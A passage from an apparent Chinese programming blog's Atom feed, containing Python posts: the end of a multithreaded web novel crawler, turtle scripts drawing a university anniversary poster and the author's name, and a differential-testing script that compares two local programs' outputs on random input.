&#x27;</span> + title + <span class="string">&#x27;.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">                file.write(result)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> IOError:</span><br><span class="line">            print(<span class="string">&#x27;第%d次重连&#x27;</span> % repeat)</span><br><span class="line">            repeat += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> repeat &gt; <span class="number">10</span>:</span><br><span class="line">                print(Host + url + <span class="string">&#x27;爬取失败！&#x27;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_menu</span>():</span></span><br><span class="line">    req = requests.get(Host, headers=header[random.randint(<span class="number">0</span>, <span class="number">4</span>)])</span><br><span class="line">    html = req.content</span><br><span class="line">    html = BeautifulSoup(html, <span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line">    <span class="keyword">global</span> name</span><br><span class="line">    name = str(html.find(<span class="string">&#x27;h1&#x27;</span>))[<span class="number">4</span>:<span class="number">-5</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(name):</span><br><span class="line">        os.makedirs(name)</span><br><span class="line">    html = html.find_all(<span class="string">&#x27;dd&#x27;</span>)</span><br><span class="line">    <span class="keyword">with</span> ThreadPoolExecutor(<span class="number">1024</span>) <span class="keyword">as</span> pool:</span><br><span class="line">        url = []</span><br><span class="line">        index = []</span><br><span class="line">        <span class="keyword">for</span> i, j <span class="keyword">in</span> enumerate(html):</span><br><span class="line">            url.append(j.find(<span class="string">&#x27;a&#x27;</span>)[<span class="string">&#x27;href&#x27;</span>])</span><br><span class="line">            index.append(i)</span><br><span class="line">        pool.map(geturl, url, index)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    start = time.time()</span><br><span class="line">    get_menu()</span><br><span class="line">    print(<span class="string">&quot;耗时%s&quot;</span> % (time.time() - start))</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;* 爬取网站已转移&lt;/p&gt;
&lt;figure class=&quot;highlight py&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;</summary>
      
    
    
    
    <category term="编程语言" scheme="https://blog.todest.cn/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"/>
    
    <category term="Python" scheme="https://blog.todest.cn/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Python/"/>
    
    
    <category term="Python" scheme="https://blog.todest.cn/tags/Python/"/>
    
    <category term="爬虫" scheme="https://blog.todest.cn/tags/%E7%88%AC%E8%99%AB/"/>
    
    <category term="多线程" scheme="https://blog.todest.cn/tags/%E5%A4%9A%E7%BA%BF%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>Python绘制校庆宣传画</title>
    <link href="https://blog.todest.cn/post/9ae2a58f/"/>
    <id>https://blog.todest.cn/post/9ae2a58f/</id>
    <published>2020-04-08T08:08:24.000Z</published>
    <updated>2020-12-01T14:45:03.232Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Python作业，用turtle绘制校庆宣传画。</p></blockquote><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> turtle</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">draw_line</span>(<span class="params">angle, length</span>):</span></span><br><span class="line">    turtle.pendown()</span><br><span class="line">    turtle.seth(angle)</span><br><span class="line">    turtle.forward(length)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">locate</span>(<span class="params">x, y, extend=None</span>):</span></span><br><span class="line">    startx, starty = <span class="number">-100</span>, <span class="number">200</span></span><br><span class="line">    <span class="keyword">if</span> extend:</span><br><span class="line">        extend.penup()</span><br><span class="line">        extend.goto(startx + x, starty - y)</span><br><span class="line">        extend.pendown()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        turtle.penup()</span><br><span class="line">        turtle.goto(startx + x, starty - y)</span><br><span class="line">        turtle.pendown()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">draw_xq</span>():</span></span><br><span class="line">    turtle.pencolor(<span class="string">&#x27;white&#x27;</span>)</span><br><span class="line">    turtle.pensize(<span class="number">1</span>)</span><br><span class="line">    turtle.penup()</span><br><span class="line">    locate(<span class="number">96</span>, <span class="number">1</span>)</span><br><span class="line">    draw_line(<span class="number">270</span>, <span class="number">15</span>)</span><br><span class="line">    locate(<span class="number">120</span>, <span class="number">28</span>)</span><br><span class="line">    turtle.fillcolor(<span class="string">&#x27;white&#x27;</span>)</span><br><span class="line">    turtle.begin_fill()</span><br><span class="line">    turtle.seth(<span class="number">120</span>)</span><br><span class="line">    turtle.circle(<span class="number">27</span>, <span class="number">120</span>)</span><br><span class="line">    draw_line(<span class="number">180</span>, <span class="number">53</span>)</span><br><span class="line">    draw_line(<span class="number">270</span>, <span class="number">155</span>)</span><br><span class="line">    draw_line(<span class="number">0</span>, <span class="number">150</span>)</span><br><span class="line">    draw_line(<span class="number">90</span>, <span class="number">155</span>)</span><br><span class="line">    draw_line(<span class="number">180</span>, <span class="number">53</span>)</span><br><span class="line">    turtle.end_fill()</span><br><span class="line">    locate(<span class="number">10</span>, <span class="number">53</span>)</span><br><span class="line">    turtle.pensize(<span class="number">6</span>)</span><br><span class="line">    turtle.pencolor(<span class="string">&#x27;red&#x27;</span>)</span><br><span class="line">    draw_line(<span class="number">0</span>, <span class="number">170</span>)</span><br><span class="line">    locate(<span class="number">20</span>, <span class="number">82</span>)</span><br><span class="line">    turtle.pensize(<span class="number">8</span>)</span><br><span class="line">    draw_line(<span class="number">0</span>, <span class="number">30</span>)</span><br><span class="line">    locate(<span class="number">170</span>, <span class="number">82</span>)</span><br><span class="line">    draw_line(<span class="number">180</span>, <span class="number">30</span>)</span><br><span class="line">    locate(<span class="number">96</span>, <span class="number">185</span>)</span><br><span class="line">    turtle.pensize(<span class="number">50</span>)</span><br><span class="line">    draw_line(<span class="number">90</span>, <span class="number">70</span>)</span><br><span class="line">    turtle.pensize(<span class="number">12</span>)</span><br><span class="line">    turtle.pencolor(<span class="string">&#x27;white&#x27;</span>)</span><br><span class="line">    locate(<span class="number">60</span>, <span class="number">125</span>)</span><br><span class="line">    draw_line(<span class="number">0</span>, <span class="number">70</span>)</span><br><span class="line">    locate(<span class="number">60</span>, <span class="number">178</span>)</span><br><span class="line">    draw_line(<span class="number">0</span>, <span class="number">70</span>)</span><br><span class="line">    turtle.pensize(<span class="number">1</span>)</span><br><span class="line">    locate(<span class="number">10</span>, <span class="number">188</span>)</span><br><span class="line">    turtle.begin_fill()</span><br><span class="line">    draw_line(<span class="number">270</span>, <span class="number">18</span>)</span><br><span class="line">    draw_line(<span class="number">240</span>, <span class="number">24</span>)</span><br><span class="line">    draw_line(<span class="number">0</span>, <span class="number">56</span>)</span><br><span class="line">    draw_line(<span class="number">240</span>, <span class="number">9</span>)</span><br><span class="line">    draw_line(<span class="number">0</span>, <span class="number">88</span>)</span><br><span class="line">    draw_line(<span class="number">120</span>, <span class="number">9</span>)</span><br><span class="line">    draw_line(<span class="number">0</span>, <span class="number">56</span>)</span><br><span class="line">    draw_line(<span class="number">120</span>, <span class="number">24</span>)</span><br><span class="line">    draw_line(<span class="number">90</span>, <span class="number">18</span>)</span><br><span class="line">    draw_line(<span class="number">180</span>, <span class="number">169</span>)</span><br><span class="line">    turtle.end_fill()</span><br><span class="line">    turtle.pensize(<span class="number">4</span>)</span><br><span class="line">    turtle.pencolor(<span class="string">&#x27;red&#x27;</span>)</span><br><span class="line">    locate(<span class="number">8</span>, <span class="number">208</span>)</span><br><span class="line">    draw_line(<span class="number">0</span>, <span class="number">58</span>)</span><br><span class="line">    draw_line(<span class="number">60</span>, <span class="number">9</span>)</span><br><span class="line">    draw_line(<span class="number">0</span>, <span class="number">53</span>)</span><br><span class="line">    draw_line(<span class="number">300</span>, <span class="number">9</span>)</span><br><span class="line">    draw_line(<span class="number">0</span>, <span class="number">58</span>)</span><br><span class="line">    turtle.hideturtle()</span><br><span class="line">    font = turtle.Turtle()</span><br><span class="line">    locate(<span class="number">43</span>, <span class="number">265</span>, font)</span><br><span class="line">    font.pencolor(<span class="string">&#x27;white&#x27;</span>)</span><br><span class="line">    font.write(<span class="string">&#x27;1909-2019&#x27;</span>, font=(<span class="string">&#x27;Aria&#x27;</span>, <span class="number">16</span>, <span class="string">&#x27;bold&#x27;</span>))</span><br><span class="line">    font.hideturtle()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">draw_word</span>():</span></span><br><span class="line">    font = turtle.Turtle()</span><br><span class="line">    locate(<span class="number">-186</span>, <span class="number">350</span>, font)</span><br><span class="line">    font.pencolor(<span class="string">&#x27;white&#x27;</span>)</span><br><span class="line">    font.write(<span class="string">&#x27;河南理工大学建校110周年&#x27;</span>, font=(<span class="string">&#x27;Aria&#x27;</span>, <span class="number">36</span>, <span class="string">&#x27;bold&#x27;</span>))</span><br><span class="line">    locate(<span class="number">-180</span>, <span class="number">380</span>, font)</span><br><span class="line">    font.write(<span class="string">&#x27;HENAN POLYTECHNIC UNIVERSITY 110TH ANNIVERSARY&#x27;</span>, font=(<span class="string">&#x27;Aria&#x27;</span>, <span class="number">16</span>, <span class="string">&#x27;bold&#x27;</span>))</span><br><span class="line">    font.color(<span class="number">200</span>/<span class="number">255</span>, <span class="number">166</span>/<span class="number">255</span>, <span class="number">92</span>/<span class="number">255</span>)</span><br><span class="line">    locate(<span class="number">300</span>, <span class="number">100</span>, font)</span><br><span class="line">    font.write(<span class="string">&#x27;好学力行&#x27;</span>, font=(<span class="string">&#x27;楷体&#x27;</span>, <span class="number">24</span>, <span class="string">&#x27;bold&#x27;</span>))</span><br><span class="line">    locate(<span class="number">-250</span>, <span class="number">200</span>, font)</span><br><span class="line">    font.write(<span class="string">&#x27;明德任责&#x27;</span>, font=(<span class="string">&#x27;楷体&#x27;</span>, <span class="number">24</span>, <span class="string">&#x27;bold&#x27;</span>))</span><br><span class="line">    font.hideturtle()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    width, height = <span class="number">800</span>, <span class="number">600</span></span><br><span class="line">    turtle.screensize(bg=<span class="string">&#x27;red&#x27;</span>)</span><br><span class="line">    turtle.setup(width, height, <span class="number">400</span>, <span class="number">100</span>)</span><br><span class="line">    turtle.speed(<span class="number">10</span>)</span><br><span class="line">    draw_xq()</span><br><span class="line">    draw_word()</span><br><span class="line">    turtle.hideturtle()</span><br><span class="line">    turtle.done()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p><strong>效果如下：</strong><br><img data-src="https://cdn.file.todest.cn/pic/2019101401.jpg" alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;Python作业，用turtle绘制校庆宣传画。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;figure class=&quot;highlight py&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line</summary>
      
    
    
    
    <category term="编程语言" scheme="https://blog.todest.cn/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"/>
    
    <category term="Python" scheme="https://blog.todest.cn/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Python/"/>
    
    
    <category term="Python" scheme="https://blog.todest.cn/tags/Python/"/>
    
    <category term="turtle" scheme="https://blog.todest.cn/tags/turtle/"/>
    
  </entry>
  
  <entry>
    <title>Python对拍数据</title>
    <link href="https://blog.todest.cn/post/e6c29894/"/>
    <id>https://blog.todest.cn/post/e6c29894/</id>
    <published>2020-04-08T08:08:24.000Z</published>
    <updated>2020-05-11T09:40:27.011Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Version1.0使用文件操作不断将随机测试数据写入code/0.in，通过管道输入到两个可执行文件，然后获取输出进行比较，直到找到不同的输出时停止，此时0.in内的内容即为结果。</p></blockquote><a id="more"></a><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> platform</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate</span>():</span></span><br><span class="line">    f = open(<span class="string">&#x27;./code/0.in&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">    <span class="string">&quot;&quot;&quot;此处写生成测试数据函数，注释内容为示例</span></span><br><span class="line"><span class="string">    T = randint(1, 1000)</span></span><br><span class="line"><span class="string">    f.writelines(&#x27;%d\n&#x27; % T)</span></span><br><span class="line"><span class="string">    lists = []</span></span><br><span class="line"><span class="string">        for i in range(T):</span></span><br><span class="line"><span class="string">        while True:</span></span><br><span class="line"><span class="string">            x = randint(1, 1e4)</span></span><br><span class="line"><span class="string">            y = randint(1, 1e4)</span></span><br><span class="line"><span class="string">            if [x, y] not in lists:</span></span><br><span class="line"><span class="string">                lists.append([x, y])</span></span><br><span class="line"><span class="string">                f.writelines(&#x27;%d %d\n&#x27; % (x, y))</span></span><br><span class="line"><span class="string">                break</span></span><br><span class="line"><span class="string">            else:</span></span><br><span class="line"><span class="string">                continue</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> platform.system() == <span class="string">&#x27;Windows&#x27;</span>:</span><br><span class="line">    os.system(<span class="string">&#x27;CHCP 65001&#x27;</span>)  <span class="comment"># Windows先更换CodePage为UTF-8,以防乱码</span></span><br><span class="line">counts = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&#x27;./code&#x27;</span>):</span><br><span class="line">    os.makedirs(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">if</span> os.path.exists(<span class="string">&#x27;./code/0.in&#x27;</span>):</span><br><span class="line">        os.remove(<span class="string">&#x27;./code/0.in&#x27;</span>)</span><br><span class="line">    generate()</span><br><span class="line">    <span class="keyword">if</span> platform.system() == <span class="string">&#x27;Windows&#x27;</span>:  <span class="comment"># Windows系统可执行文件预先放置</span></span><br><span class="line">        ans1 = os.popen(<span class="string">&#x27;type .\\code\\0.in|.\\code\\1.exe&#x27;</span>)</span><br><span class="line">        ans2 = os.popen(<span class="string">&#x27;type .\\code\\0.in|.\\code\\2.exe&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:   <span class="comment"># Linux系统可执行文件预先放置</span></span><br><span class="line">        ans1 = os.popen(<span class="string">&#x27;cat code/0.in | code/1&#x27;</span>)</span><br><span class="line">        ans2 = os.popen(<span class="string">&#x27;cat code/0.in | code/2&#x27;</span>)</span><br><span class="line">    out1 = ans1.read()</span><br><span class="line">    out2 = ans2.read()</span><br><span class="line">    <span class="keyword">if</span> out1 == out2:</span><br><span class="line">        print(<span class="string">&#x27;第&#x27;</span>, counts, <span class="string">&#x27;次尝试: &#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        print(out1)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    counts = counts + <span class="number">1</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;Version1.0使用文件操作不断将随机测试数据写入code/0.in，通过管道输入到两个可执行文件，然后获取输出进行比较，直到找到不同的输出时停止，此时0.in内的内容即为结果。&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="编程语言" scheme="https://blog.todest.cn/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"/>
    
    <category term="Python" scheme="https://blog.todest.cn/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Python/"/>
    
    
    <category term="Python" scheme="https://blog.todest.cn/tags/Python/"/>
    
    <category term="算法" scheme="https://blog.todest.cn/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>Turtle绘制字体</title>
    <link href="https://blog.todest.cn/post/50bbd1a0/"/>
    <id>https://blog.todest.cn/post/50bbd1a0/</id>
    <published>2020-04-08T08:08:24.000Z</published>
    <updated>2020-12-01T14:45:51.434Z</updated>
    
    <content type="html"><![CDATA[<p>今天闲着没事，就用python的turtle库绘制了一下自己的名字（其实是老师留的作业）。<br>咳咳，言归正传，我先网上选了个好看又好画的字体，于是保存下载画图打开，这样我们就有了每个笔画的坐标，接下来就开始操作了（嘻嘻）。</p><a id="more"></a><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> turtle <span class="keyword">import</span> *</span><br><span class="line">startx, starty = <span class="number">-300</span>, <span class="number">300</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">locate</span>(<span class="params">x, y</span>):</span></span><br><span class="line">    penup()</span><br><span class="line">    goto(startx + x, starty - y)</span><br><span class="line">    pendown()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">draw</span>(<span class="params">angle, lenth</span>):</span></span><br><span class="line">    seth(angle)</span><br><span class="line">    forward(lenth)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    pensize(<span class="number">6</span>)</span><br><span class="line">    speed(<span class="number">5</span>)</span><br><span class="line">    pencolor(<span class="string">&quot;red&quot;</span>)</span><br><span class="line">    <span class="comment"># G</span></span><br><span class="line">    locate(<span class="number">222</span>, <span class="number">77</span>)</span><br><span class="line">    draw(<span class="number">180</span>, <span class="number">80</span>)</span><br><span class="line">    draw(<span class="number">270</span>, <span class="number">130</span>)</span><br><span class="line">    draw(<span class="number">0</span>, <span class="number">60</span>)</span><br><span class="line">    locate(<span class="number">164</span>, <span class="number">126</span>)</span><br><span class="line">    draw(<span class="number">0</span>, <span class="number">64</span>)</span><br><span class="line">    locate(<span class="number">214</span>, <span class="number">126</span>)</span><br><span class="line">    draw(<span class="number">270</span>, <span class="number">86</span>)</span><br><span class="line">    <span class="comment"># Y</span></span><br><span class="line">    locate(<span class="number">264</span>, <span class="number">74</span>)</span><br><span class="line">    draw(<span class="number">270</span>, <span class="number">56</span>)</span><br><span class="line">    locate(<span class="number">340</span>, <span class="number">74</span>)</span><br><span class="line">    draw(<span class="number">270</span>, <span class="number">56</span>)</span><br><span class="line">    draw(<span class="number">180</span>, <span class="number">44</span>)</span><br><span class="line">    draw(<span class="number">270</span>, <span class="number">84</span>)</span><br><span class="line">    <span class="comment"># H</span></span><br><span class="line">    locate(<span class="number">384</span>, <span class="number">74</span>)</span><br><span class="line">    draw(<span class="number">270</span>, <span class="number">140</span>)</span><br><span class="line">    locate(<span class="number">400</span>, <span class="number">128</span>)</span><br><span class="line">    draw(<span class="number">0</span>, <span class="number">48</span>)</span><br><span class="line">    locate(<span class="number">460</span>, <span class="number">74</span>)</span><br><span class="line">    draw(<span class="number">270</span>, <span class="number">140</span>)</span><br><span class="line">    <span class="comment"># 郭</span></span><br><span class="line">    locate(<span class="number">78</span>, <span class="number">285</span>)</span><br><span class="line">    draw(<span class="number">270</span>, <span class="number">20</span>)</span><br><span class="line">    locate(<span class="number">40</span>, <span class="number">305</span>)</span><br><span class="line">    draw(<span class="number">0</span>, <span class="number">80</span>)</span><br><span class="line">    locate(<span class="number">50</span>, <span class="number">325</span>)</span><br><span class="line">    draw(<span class="number">270</span>, <span class="number">25</span>)</span><br><span class="line">    locate(<span class="number">50</span>, <span class="number">325</span>)</span><br><span class="line">    draw(<span class="number">0</span>, <span class="number">60</span>)</span><br><span class="line">    draw(<span class="number">270</span>, <span class="number">25</span>)</span><br><span class="line">    locate(<span class="number">50</span>, <span class="number">350</span>)</span><br><span class="line">    draw(<span class="number">0</span>, <span class="number">60</span>)</span><br><span class="line">    locate(<span class="number">46</span>, <span class="number">364</span>)</span><br><span class="line">    draw(<span class="number">0</span>, <span class="number">60</span>)</span><br><span class="line">    draw(<span class="number">270</span>, <span class="number">20</span>)</span><br><span class="line">    draw(<span class="number">180</span>, <span class="number">25</span>)</span><br><span class="line">    draw(<span class="number">270</span>, <span class="number">70</span>)</span><br><span class="line">    draw(<span class="number">180</span>, <span class="number">30</span>)</span><br><span class="line">    locate(<span class="number">38</span>, <span class="number">402</span>)</span><br><span class="line">    draw(<span class="number">0</span>, <span class="number">80</span>)</span><br><span class="line">    locate(<span class="number">130</span>, <span class="number">304</span>)</span><br><span class="line">    draw(<span class="number">270</span>, <span class="number">155</span>)</span><br><span class="line">    locate(<span class="number">130</span>, <span class="number">304</span>)</span><br><span class="line">    draw(<span class="number">0</span>, <span class="number">42</span>)</span><br><span class="line">    draw(<span class="number">270</span>, <span class="number">46</span>)</span><br><span class="line">    draw(<span class="number">180</span>, <span class="number">30</span>)</span><br><span class="line">    draw(<span class="number">0</span>, <span class="number">30</span>)</span><br><span class="line">    draw(<span class="number">270</span>, <span class="number">60</span>)</span><br><span class="line">    draw(<span class="number">180</span>, <span class="number">30</span>)</span><br><span class="line">    <span class="comment"># 永</span></span><br><span class="line">    locate(<span class="number">270</span>, <span class="number">295</span>)</span><br><span class="line">    draw(<span class="number">0</span>, <span class="number">46</span>)</span><br><span class="line">    locate(<span class="number">250</span>, <span class="number">325</span>)</span><br><span class="line">    draw(<span class="number">0</span>, <span class="number">54</span>)</span><br><span class="line">    draw(<span class="number">270</span>, <span class="number">128</span>)</span><br><span class="line">    draw(<span class="number">180</span>, <span class="number">38</span>)</span><br><span class="line">    locate(<span class="number">232</span>, <span class="number">356</span>)</span><br><span class="line">    draw(<span class="number">0</span>, <span class="number">38</span>)</span><br><span class="line">    draw(<span class="number">270</span>, <span class="number">60</span>)</span><br><span class="line">    draw(<span class="number">180</span>, <span class="number">38</span>)</span><br><span class="line">    locate(<span class="number">370</span>, <span class="number">356</span>)</span><br><span class="line">    draw(<span class="number">180</span>, <span class="number">38</span>)</span><br><span class="line">    draw(<span class="number">270</span>, <span class="number">60</span>)</span><br><span class="line">    draw(<span class="number">0</span>, <span class="number">38</span>)</span><br><span class="line">    <span class="comment"># 航</span></span><br><span class="line">    locate(<span class="number">438</span>, <span class="number">286</span>)</span><br><span class="line">    draw(<span class="number">270</span>, <span class="number">24</span>)</span><br><span class="line">    locate(<span class="number">428</span>, <span class="number">312</span>)</span><br><span class="line">    draw(<span class="number">270</span>, <span class="number">140</span>)</span><br><span class="line">    draw(<span class="number">180</span>, <span class="number">18</span>)</span><br><span class="line">    locate(<span class="number">428</span>, <span class="number">312</span>)</span><br><span class="line">    draw(<span class="number">0</span>, <span class="number">42</span>)</span><br><span class="line">    draw(<span 